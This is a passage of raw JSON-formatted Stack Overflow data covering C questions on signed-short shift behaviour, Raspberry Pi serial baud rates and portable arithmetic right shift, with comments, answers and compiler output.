"https://www.gravatar.com/avatar/f66e2987d5d24e6d8a1f686154a51c21?s=128&d=identicon&r=PG", "display_name": "Sander De Dycker", "link": "https://stackoverflow.com/users/822669/sander-de-dycker"}, "reply_to_user": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "edited": false, "score": 0, "creation_date": 1544628812, "post_id": 53746248, "comment_id": 94345090, "body": "@interjay : fair enough - close vote retracted"}, {"owner": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "edited": false, "score": 1, "creation_date": 1544632438, "post_id": 53746248, "comment_id": 94347335, "body": "The problem behind the scenes is that the C shift operator is a <b>&#39;logical shift&#39;</b>, meaning that it <b>doesn&#39;t care of sign handling</b>. The promotion between integers follow well known rules that in the specific case, where a <code>MAX_INT &gt;= MAX_SHORT</code> should always be true, should guarantee a correct representation of a <code>short</code> in an <code>int</code>. But when it come to the shift the behavior depends on machine and specific instructions coded by the compiler. I.e. a negative number can become positive right shifted, and the opposite for left shift. But what if CPU uses SAR/SAL arithmetic shifts instead?"}, {"owner": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 0, "creation_date": 1544634612, "post_id": 53746248, "comment_id": 94348494, "body": "Kind of related <a href=\"https://stackoverflow.com/q/24371868/1708801\">Why must a short be converted to an int before arithmetic operations in C and C++?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "is_accepted": true, "score": 6, "last_activity_date": 1544629548, "last_edit_date": 1544629548, "creation_date": 1544629164, "answer_id": 53746492, "question_id": 53746248, "link": "https://stackoverflow.com/questions/53746248/is-shifting-the-signed-bit-of-a-signed-short-undefined-behaviour-in-c/53746492#53746492", "title": "Is shifting the signed bit of a signed short undefined behaviour in C?", "body": "<p>When a small integer type is used in most types of expressions, it is <a href=\"https://stackoverflow.com/questions/46073295/implicit-type-promotion-rules\">promoted</a> to an <code>int</code> (if <code>int</code> can fit all values of the original type), and the expression is then performed on the <code>int</code>.</p>\n\n<p>This gives two possibilites:</p>\n\n<ol>\n<li>On a platform where <code>int</code> is the same size as <code>short</code>, the shift will be undefined behavior because it shifts into the <code>int</code>'s sign bit. (More accurately, the reason is that the result cannot be represented as an <code>int</code>). See <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.5.7p4\" rel=\"nofollow noreferrer\">C11 6.5.7p4</a>.</li>\n<li>On a platform where <code>int</code> has more bits than <code>short</code>, the shift itself will be successful (though it can be undefined if you're shifting by more than 1). However, when you assign the result back into a <code>short</code> variable, the value will not be able to be represented as a <code>short</code>. The actual value that will be assigned is implementation-defined. See <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.3.1.3p3\" rel=\"nofollow noreferrer\">C11 6.3.1.3p3</a>.</li>\n</ol>\n"}], "owner": {"reputation": 113, "user_id": 8589924, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208989683008688/picture?type=large", "display_name": "Benedict Aaron Tjandra", "link": "https://stackoverflow.com/users/8589924/benedict-aaron-tjandra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 122, "favorite_count": 0, "accepted_answer_id": 53746492, "answer_count": 1, "score": 4, "last_activity_date": 1544631152, "creation_date": 1544628347, "last_edit_date": 1544631152, "question_id": 53746248, "link": "https://stackoverflow.com/questions/53746248/is-shifting-the-signed-bit-of-a-signed-short-undefined-behaviour-in-c", "title": "Is shifting the signed bit of a signed short undefined behaviour in C?", "body": "<p>I have heard that shifting into signed bit of an integer, i.e. </p>\n\n<pre><code>int test = INT_MAX;\ntest = (test&lt;&lt;1) + 1;\n</code></pre>\n\n<p>is undefined behaviour due to test being greater than INT_MAX. But will this behaviour be encountered in signed short variables, i.e.</p>\n\n<pre><code>short test1 = SHRT_MAX;\ntest1 = (test1&lt;&lt;1) + 1;\n</code></pre>\n\n<p>? </p>\n\n<p>At the moment I have not come across any relevant documentation.</p>\n\n<p>EDIT: I know that undefined behaviour will result in the case of integers, but not of short. </p>\n"}, {"tags": ["c", "serial-port", "raspberry-pi3", "baud-rate"], "comments": [{"owner": {"reputation": 567, "user_id": 8620128, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/c3Qyy.jpg?s=128&g=1", "display_name": "itzFlubby", "link": "https://stackoverflow.com/users/8620128/itzflubby"}, "edited": false, "score": 0, "creation_date": 1544629465, "post_id": 53746214, "comment_id": 94345526, "body": "Have you tried using <b>cfsetispeed()</b> and <b>cfsetospeed()</b> instead?"}, {"owner": {"reputation": 567, "user_id": 8620128, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/c3Qyy.jpg?s=128&g=1", "display_name": "itzFlubby", "link": "https://stackoverflow.com/users/8620128/itzflubby"}, "edited": false, "score": 0, "creation_date": 1544629676, "post_id": 53746214, "comment_id": 94345665, "body": "Also, try initializing your arguments before you give them to a function, like:   <b>speed_t my_speed = B300;</b>     <b>cfsetspeed (&amp;RSopt, my_speed);</b>"}, {"owner": {"reputation": 65, "user_id": 10754462, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6eecdc55e48b1321546b3d1080a1ab0f?s=128&d=identicon&r=PG&f=1", "display_name": "Bob SO", "link": "https://stackoverflow.com/users/10754462/bob-so"}, "reply_to_user": {"reputation": 567, "user_id": 8620128, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/c3Qyy.jpg?s=128&g=1", "display_name": "itzFlubby", "link": "https://stackoverflow.com/users/8620128/itzflubby"}, "edited": false, "score": 0, "creation_date": 1544631408, "post_id": 53746214, "comment_id": 94346761, "body": "I have tried both ideas, but I did not succeed."}, {"owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1544649396, "post_id": 53746214, "comment_id": 94355602, "body": "What do <code>cfsetspeed (&amp;RSopt, (speed_t)B300);</code> and subsequent <code>tcsetattr (fd, TCSANOW, &amp;RSopt);</code> return? What does <code>perror</code> say?"}, {"owner": {"reputation": 65, "user_id": 10754462, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6eecdc55e48b1321546b3d1080a1ab0f?s=128&d=identicon&r=PG&f=1", "display_name": "Bob SO", "link": "https://stackoverflow.com/users/10754462/bob-so"}, "edited": false, "score": 0, "creation_date": 1544686770, "post_id": 53746214, "comment_id": 94366292, "body": "Both functions return 0. There is no error."}, {"owner": {"reputation": 65, "user_id": 10754462, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6eecdc55e48b1321546b3d1080a1ab0f?s=128&d=identicon&r=PG&f=1", "display_name": "Bob SO", "link": "https://stackoverflow.com/users/10754462/bob-so"}, "edited": false, "score": 0, "creation_date": 1544691139, "post_id": 53746214, "comment_id": 94368258, "body": "I&#39;ve checked that, the problem occures also during setting the serial port parameters in command line:   <code>stty -F &#47;dev&#47;ttyS0 speed 600 cs8 -cstopb -parenb</code> - OK;   <code>stty -F &#47;dev&#47;ttyS0 speed 300 cs8 -cstopb -parenb</code> - error."}], "owner": {"reputation": 65, "user_id": 10754462, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6eecdc55e48b1321546b3d1080a1ab0f?s=128&d=identicon&r=PG&f=1", "display_name": "Bob SO", "link": "https://stackoverflow.com/users/10754462/bob-so"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 91, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1544628233, "creation_date": 1544628233, "question_id": 53746214, "link": "https://stackoverflow.com/questions/53746214/problem-with-serial-port-speed-changing-on-br300-or-lower-in-c-on-raspberry-pi", "title": "Problem with serial port speed changing on BR300 or lower in c++ on Raspberry PI 3", "body": "<p>I have to operate on serial port with baud rate equal BR300. However the commands   <code>cfsetspeed (&amp;RSopt, (speed_t)B300);</code> and <code>tcsetattr (fd, TCSANOW, &amp;RSopt);</code> do not change the speed. As I've verified those commands work correctly for speeds B0 and higher than B300.</p>\n\n<p>How can I set serial port transsmision speed to B300.</p>\n\n<p>See my code bellow:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;termios.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;fcntl.h&gt;\n\nint main ()\n{\n    struct termios RSopt;\n    int fd;\n\n    fd = open( \"/dev/ttyS0\", O_RDWR | O_NOCTTY | O_NDELAY );    \n\n    tcgetattr(fd, &amp;RSopt);\n    cfmakeraw(&amp;RSopt);\n\n    printf(\"Current speed:  \");\n    printf(\"%d\\n\",RSopt.c_ispeed);\n    printf(\"Change speed to 7 (B300)\\n\");\n    cfsetspeed (&amp;RSopt, (speed_t)B300);\n    tcsetattr (fd, TCSANOW, &amp;RSopt); \n\n    //-------------------------------------------------------\n    tcgetattr(fd, &amp;RSopt);\n    printf(\"Current speed:  \");\n    printf(\"%d\",RSopt.c_ispeed);\n    printf(\"  &lt;--- speed not changed!\\n\");\n    printf(\"Change speed to 9 (B1200)\\n\");\n    cfsetspeed (&amp;RSopt, (speed_t)B1200);\n    tcsetattr (fd, TCSANOW, &amp;RSopt);     \n\n    //-------------------------------------------------------\n    tcgetattr(fd, &amp;RSopt);\n    printf(\"Current speed:  \");\n    printf(\"%d\\n\",RSopt.c_ispeed);\n    printf(\"Change speed to 8 (B600)\\n\");\n    cfsetspeed (&amp;RSopt, (speed_t)B600);\n    tcsetattr (fd, TCSANOW, &amp;RSopt);     \n\n    tcgetattr(fd, &amp;RSopt);\n    printf(\"Current spped:  \");\n    printf(\"%d\\n\",RSopt.c_ispeed);      \n    close(fd);\n}\n</code></pre>\n"}, {"tags": ["c", "bit-manipulation", "bit-shift", "integer-arithmetic", "signed-integer"], "comments": [{"owner": {"reputation": 6696, "user_id": 537980, "user_type": "registered", "accept_rate": 63, "profile_image": "https://i.stack.imgur.com/DZUB4.png?s=128&g=1", "display_name": "ctrl-alt-delor", "link": "https://stackoverflow.com/users/537980/ctrl-alt-delor"}, "edited": false, "score": 5, "creation_date": 1544632237, "post_id": 53746160, "comment_id": 94347219, "body": "Implementation defined, means that it is defined, but not portable (other implementations may do it differently). (GCC tries do define undefined behaviour as well.) For gcc on x86 it is well defined. You can use the pre-processor, to enable a slower implementation, when needed."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544634713, "post_id": 53746160, "comment_id": 94348544, "body": "What is the needed range of <code>log2_denominator</code>? e.g. 32-bit <code>int</code>: Do you need [0..31], [0..30], [1..31], [1..30], or what?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544634915, "post_id": 53746160, "comment_id": 94348635, "body": "Have you tried <code>numerator &#47; (1 &lt;&lt; log2_denominator);</code> with high optimization active?"}, {"owner": {"reputation": 2451, "user_id": 1729784, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d97a5cecaf61887679df1f79b59b157?s=128&d=identicon&r=PG", "display_name": "DaBler", "link": "https://stackoverflow.com/users/1729784/dabler"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544635774, "post_id": 53746160, "comment_id": 94349175, "body": "@chux In practice, the <i>b</i> is a small compile-time constant. So we can assume that <i>b</i> is in [0..<code>sizeof(int)</code>-1]."}, {"owner": {"reputation": 2451, "user_id": 1729784, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d97a5cecaf61887679df1f79b59b157?s=128&d=identicon&r=PG", "display_name": "DaBler", "link": "https://stackoverflow.com/users/1729784/dabler"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544635887, "post_id": 53746160, "comment_id": 94349238, "body": "@chux In C, the &#39; / &#39; operator always rounds towards zero. This is not the floor function."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544636090, "post_id": 53746160, "comment_id": 94349347, "body": "True, <code>&#47;</code> not floor for all <code>num &lt; 0</code>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544636341, "post_id": 53746160, "comment_id": 94349491, "body": "Aside: As coding goal uses a <b>constant</b> <code>b</code>, code <code>c = floor_div_pow2(a, CONSTANT_B);</code> is counter productive to program performance.  <code>c = MACRO(a, CONSTANT_B)</code> makes more sense."}, {"owner": {"reputation": 2451, "user_id": 1729784, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d97a5cecaf61887679df1f79b59b157?s=128&d=identicon&r=PG", "display_name": "DaBler", "link": "https://stackoverflow.com/users/1729784/dabler"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544637000, "post_id": 53746160, "comment_id": 94349847, "body": "@chux. This was true ~20 years ago. At present, optimizing compilers are incredibly good in their purpose. See <a href=\"https://godbolt.org/z/qdbUzy\" rel=\"nofollow noreferrer\">this</a>, for example."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1544637434, "post_id": 53746160, "comment_id": 94350052, "body": "@DaBler Yes, well aware such a optimization is possible - and have been for 20y, yet OP&#39;s goals seem conflicted.  On one hand,  OP is concerned about <i>implementation-defined behavior</i> yet then wants an answer focusing on a particular implementation (gcc and x86-64) that already meets the goal.  To that end, a portable, language specific appears to be sought.  1) To make speedier - in general, a macro is called for 2) potentially using a macro also opens up possibility."}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 1, "creation_date": 1544753479, "post_id": 53746160, "comment_id": 94396987, "body": "<a href=\"https://stackoverflow.com/q/31879878/995714\">How can I perform arithmetic right shift in C in a portable way?</a>, <a href=\"https://stackoverflow.com/q/25206670/995714\">How to implement arithmetic right shift from logical shift?</a>"}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1544754035, "post_id": 53746160, "comment_id": 94397112, "body": "nowadays you can hardly find a C implementation that doesn&#39;t do arithmetic right shift on a signed type, so you can simply use <code>assert</code> to make sure that the shift is arithmetic"}], "answers": [{"comments": [{"owner": {"reputation": 13530, "user_id": 593382, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/f7326fd554e09edf21ca727d6854e22e?s=128&d=identicon&r=PG", "display_name": "Grady Player", "link": "https://stackoverflow.com/users/593382/grady-player"}, "edited": false, "score": 1, "creation_date": 1544632447, "post_id": 53747415, "comment_id": 94347342, "body": "I suggest that over an assert because asserts are usually compiled out of release code."}, {"owner": {"reputation": 6696, "user_id": 537980, "user_type": "registered", "accept_rate": 63, "profile_image": "https://i.stack.imgur.com/DZUB4.png?s=128&g=1", "display_name": "ctrl-alt-delor", "link": "https://stackoverflow.com/users/537980/ctrl-alt-delor"}, "edited": false, "score": 2, "creation_date": 1544632560, "post_id": 53747415, "comment_id": 94347415, "body": "I would put it into the build system."}, {"owner": {"reputation": 13530, "user_id": 593382, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/f7326fd554e09edf21ca727d6854e22e?s=128&d=identicon&r=PG", "display_name": "Grady Player", "link": "https://stackoverflow.com/users/593382/grady-player"}, "reply_to_user": {"reputation": 6696, "user_id": 537980, "user_type": "registered", "accept_rate": 63, "profile_image": "https://i.stack.imgur.com/DZUB4.png?s=128&g=1", "display_name": "ctrl-alt-delor", "link": "https://stackoverflow.com/users/537980/ctrl-alt-delor"}, "edited": false, "score": 0, "creation_date": 1544632656, "post_id": 53747415, "comment_id": 94347467, "body": "well it is implementation defined, and I dont think it is required to be the same executing the same code on different processors running the same ABI and same executable... Like it would be legal for a compiler to compile this to code that has different results on different generations of intel or amd processors."}, {"owner": {"reputation": 6696, "user_id": 537980, "user_type": "registered", "accept_rate": 63, "profile_image": "https://i.stack.imgur.com/DZUB4.png?s=128&g=1", "display_name": "ctrl-alt-delor", "link": "https://stackoverflow.com/users/537980/ctrl-alt-delor"}, "edited": false, "score": 1, "creation_date": 1544633048, "post_id": 53747415, "comment_id": 94347701, "body": "The C standard says that the compiler must clearly document, what the code will do.  So yes it can do any of the allowed behaviours, so long as it is documented. So if it says in the documentation, that on this processor it will do this, and on that it will do this, then the compiler is compliant."}, {"owner": {"reputation": 2451, "user_id": 1729784, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d97a5cecaf61887679df1f79b59b157?s=128&d=identicon&r=PG", "display_name": "DaBler", "link": "https://stackoverflow.com/users/1729784/dabler"}, "edited": false, "score": 0, "creation_date": 1544634448, "post_id": 53747415, "comment_id": 94348405, "body": "Indeed, not a bad idea. Since the GCC declares that &quot;Signed \u2018&gt;&gt;\u2019 acts on negative numbers by sign extension.&quot; (<a href=\"https://gcc.gnu.org/onlinedocs/gcc/Integers-implementation.html\" rel=\"nofollow noreferrer\">source</a>), one could also check the compiler used to compile the program at compile time."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544635087, "post_id": 53747415, "comment_id": 94348746, "body": "1) What advantage do you see with <code>if (~0ll != ~0ll&gt;&gt;8)</code> over <code>if (~0 != ~0&gt;&gt;8)</code>? 2)  Looks like a good <code>_Static_assert()</code> candidate."}, {"owner": {"reputation": 13530, "user_id": 593382, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/f7326fd554e09edf21ca727d6854e22e?s=128&d=identicon&r=PG", "display_name": "Grady Player", "link": "https://stackoverflow.com/users/593382/grady-player"}, "edited": false, "score": 0, "creation_date": 1544666900, "post_id": 53747415, "comment_id": 94360812, "body": "_Static_assert() is a compile time thing...  people are saying that should be good enough... but there really I would like to see it at runtime also..."}], "tags": [], "owner": {"reputation": 13530, "user_id": 593382, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/f7326fd554e09edf21ca727d6854e22e?s=128&d=identicon&r=PG", "display_name": "Grady Player", "link": "https://stackoverflow.com/users/593382/grady-player"}, "is_accepted": false, "score": 2, "last_activity_date": 1544632361, "creation_date": 1544632361, "answer_id": 53747415, "question_id": 53746160, "link": "https://stackoverflow.com/questions/53746160/how-to-implement-arithmetic-right-shift-in-c/53747415#53747415", "title": "How to implement arithmetic right shift in C", "body": "<p>sometime early in your runtime you could check the sanity of your assumption</p>\n\n<pre><code>int check_sanity()\n{\n    if (~0ll != ~0ll&gt;&gt;8)\n    {\n        return 0; // not sane\n    }\n    return 1; // sane\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2451, "user_id": 1729784, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d97a5cecaf61887679df1f79b59b157?s=128&d=identicon&r=PG", "display_name": "DaBler", "link": "https://stackoverflow.com/users/1729784/dabler"}, "edited": false, "score": 0, "creation_date": 1544721287, "post_id": 53766752, "comment_id": 94385735, "body": "Does the <code>~(~value &gt;&gt; amount)</code> trick work for any signed integer representation (two&#39;s complement, ones&#39; complement, or sign-magnitude)?"}, {"owner": {"reputation": 3183, "user_id": 3063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/94037fcc56672e711673c00feba9d62a?s=128&d=identicon&r=PG", "display_name": "palotasb", "link": "https://stackoverflow.com/users/3063/palotasb"}, "reply_to_user": {"reputation": 2451, "user_id": 1729784, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d97a5cecaf61887679df1f79b59b157?s=128&d=identicon&r=PG", "display_name": "DaBler", "link": "https://stackoverflow.com/users/1729784/dabler"}, "edited": false, "score": 0, "creation_date": 1544734495, "post_id": 53766752, "comment_id": 94391637, "body": "No, good point. It&#39;s not actually a portable solution for ones&#39; complement. E.g., using ones&#39; complement: <code>shr(-1, 1) = ~(~-1 &gt;&gt; 1) = ~(1 &gt;&gt; 1) = ~(0) = -0</code> using <a href=\"https://en.wikipedia.org/wiki/Ones%27_complement\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Ones%27_complement</a> -- I <i>think</i> that&#39;s not equal to -1, not even with ones&#39; complement, but I&#39;m already too confused be the <i>existence</i> of <code>-0</code>. It probably breaks for sign magnitude as well."}, {"owner": {"reputation": 42446, "user_id": 902497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff13ece6277497484bfa2911c6183a30?s=128&d=identicon&r=PG", "display_name": "Raymond Chen", "link": "https://stackoverflow.com/users/902497/raymond-chen"}, "edited": false, "score": 1, "creation_date": 1544756136, "post_id": 53766752, "comment_id": 94397534, "body": "One&#39;s complement almost works, except it rounds negative numbers toward zero rather than toward negative infinity. Sign-magnitude is a lost cause, though. Fortunately, in practice, you&#39;re not going to see any of those old-timey systems any more."}, {"owner": {"reputation": 2451, "user_id": 1729784, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d97a5cecaf61887679df1f79b59b157?s=128&d=identicon&r=PG", "display_name": "DaBler", "link": "https://stackoverflow.com/users/1729784/dabler"}, "reply_to_user": {"reputation": 42446, "user_id": 902497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff13ece6277497484bfa2911c6183a30?s=128&d=identicon&r=PG", "display_name": "Raymond Chen", "link": "https://stackoverflow.com/users/902497/raymond-chen"}, "edited": false, "score": 0, "creation_date": 1544804576, "post_id": 53766752, "comment_id": 94418302, "body": "@RaymondChen Yes, I can confirm exactly what you wrote above. The trick only works on two&#39;s complement architectures. However, it is quite easy to check whether the underlying signed integer representation is two&#39;s complement in compile time or somewhere early in runtime."}, {"owner": {"reputation": 2451, "user_id": 1729784, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d97a5cecaf61887679df1f79b59b157?s=128&d=identicon&r=PG", "display_name": "DaBler", "link": "https://stackoverflow.com/users/1729784/dabler"}, "edited": false, "score": 0, "creation_date": 1544804582, "post_id": 53766752, "comment_id": 94418305, "body": "I can also confirm that it compiles into the same code as the code fragment in the question. See this for example: <a href=\"https://godbolt.org/z/6rOBu-\" rel=\"nofollow noreferrer\">godbolt.org/z/6rOBu-</a>"}], "tags": [], "owner": {"reputation": 3183, "user_id": 3063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/94037fcc56672e711673c00feba9d62a?s=128&d=identicon&r=PG", "display_name": "palotasb", "link": "https://stackoverflow.com/users/3063/palotasb"}, "is_accepted": true, "score": 5, "last_activity_date": 1544734022, "last_edit_date": 1544734022, "creation_date": 1544720536, "answer_id": 53766752, "question_id": 53746160, "link": "https://stackoverflow.com/questions/53746160/how-to-implement-arithmetic-right-shift-in-c/53766752#53766752", "title": "How to implement arithmetic right shift in C", "body": "<pre><code>#define USES_ARITHMETIC_SHR(TYPE) ((TYPE)(-1) &gt;&gt; 1 == (TYPE)(-1))\n\nint asr(int value, int amount) /* Better codegen on some older compilers */\n{\n    return !USES_ARITHMETIC_SHR(int) &amp;&amp; value &lt; 0 ? ~(~value &gt;&gt; amount) : value &gt;&gt; amount ;\n}\n\nint asr2(int value, int amount) /* Completely portable */\n{\n    return value &lt; 0 ? ~(~value &gt;&gt; amount) : value &gt;&gt; amount ;\n}\n</code></pre>\n\n<p>This code decides whether to just use the builtin <code>&gt;&gt;</code> operator or not first. You might want to either trust or not trust the preprocessor giving you the same result as the target architecture, but a safe fallback is to not trust it.</p>\n\n<p>Let's explain the <code>value &lt; 0 ? ~(~value &gt;&gt; amount) : value &gt;&gt; amount</code> part.</p>\n\n<ol>\n<li>If <code>value &gt;= 0</code> then it doesn't matter whether <code>&gt;&gt;</code> is logical or arithmetic, we can use it.</li>\n<li>If <code>value &lt; 0</code> then <code>~value</code> is the bitwise complement which will be a positive number and <code>(~value &gt;&gt; amount)</code> will be portable (the top <code>amount</code> number of bits will be cleared, the rest shifted right as expected).<br>\n<code>~(~value &gt;&gt; amount)</code> will flip all the bits back, including flipping the top <code>amount</code> number of zeroes to ones which is exactly what you want with arithmetic right shifting.</li>\n</ol>\n\n<p>The code assuming <code>USES_ARITHMETIC_SHR(int) == true</code> compiles with <code>-O2</code> into:</p>\n\n<pre><code>asr(int, int): // x86-64 GCC 4.4.7\n    mov     eax, edi\n    mov     ecx, esi\n    sar     eax, cl\n    ret\nasr(int, int): // x86-64 Clang 3.4.1\n    mov     cl, sil\n    sar     edi, cl\n    mov     eax, edi\n    ret\nasr(int, int): // ARM GCC 4.5.4\n    mov     r0, r0, asr r1\n    bx      lr\n</code></pre>\n\n<p>This <em>should</em> be portable but I'm also unsure if it pedantically really is. If you aren't either, you can <code>#define USES_ARITHMETIC_SHR(TYPE) false</code> or just omit checking it and only check <code>value &lt; 0</code>. But that results in less optimal code on the some older compilers.</p>\n\n<p>The newest version of the compilers (GCC 8+, Clang 7+) compile both versions, <code>asr</code> and <code>asr2</code> to the same, efficient assembly as above, so you can use either versions of the code. Below is how older compilers do with <code>asr2</code>, a very portable solution.</p>\n\n<pre><code>asr2(int, int): // x86-64 GCC 4.4.7\n    test    edi, edi\n    js      .L8\n    mov     eax, edi\n    mov     ecx, esi\n    sar     eax, cl\n    ret\n  .L8:\n    mov     eax, edi\n    mov     ecx, esi\n    not     eax\n    sar     eax, cl\n    not     eax\n    ret\nasr2(int, int): // x86-64 Clang 3.4.1\n    mov     cl, sil\n    sar     edi, cl\n    mov     eax, edi\n    ret\nasr2(int, int): // ARM GCC 4.5.4\n    cmp     r0, #0\n    mvnlt   r0, r0\n    mvnlt   r0, r0, asr r1\n    movge   r0, r0, asr r1\n    bx      lr\n</code></pre>\n"}], "owner": {"reputation": 2451, "user_id": 1729784, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d97a5cecaf61887679df1f79b59b157?s=128&d=identicon&r=PG", "display_name": "DaBler", "link": "https://stackoverflow.com/users/1729784/dabler"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2703, "favorite_count": 2, "accepted_answer_id": 53766752, "answer_count": 2, "score": 8, "last_activity_date": 1547062854, "creation_date": 1544628055, "last_edit_date": 1547062854, "question_id": 53746160, "link": "https://stackoverflow.com/questions/53746160/how-to-implement-arithmetic-right-shift-in-c", "title": "How to implement arithmetic right shift in C", "body": "<p>Many lossless algorithms in signal processing require an evaluation of the expression of the form \u230a&nbsp;<em>a</em>&nbsp;/&nbsp;2<sup><em>b</em></sup>&nbsp;\u230b, where <em>a</em>, <em>b</em> are signed (<em>a</em> possibly negative, <em>b</em> non-negative) integers and \u230a\u00b7\u230b is the floor function. This usually leads to the following implementation.</p>\n\n<pre><code>int floor_div_pow2(int numerator, int log2_denominator)\n{\n    return numerator &gt;&gt; log2_denominator;\n}\n</code></pre>\n\n<p>Unfortunately, the C standard states that the result of the <code>&gt;&gt;</code> operator is implementation-defined if the left operand has a signed type and a negative value.</p>\n\n<p>To ensure the 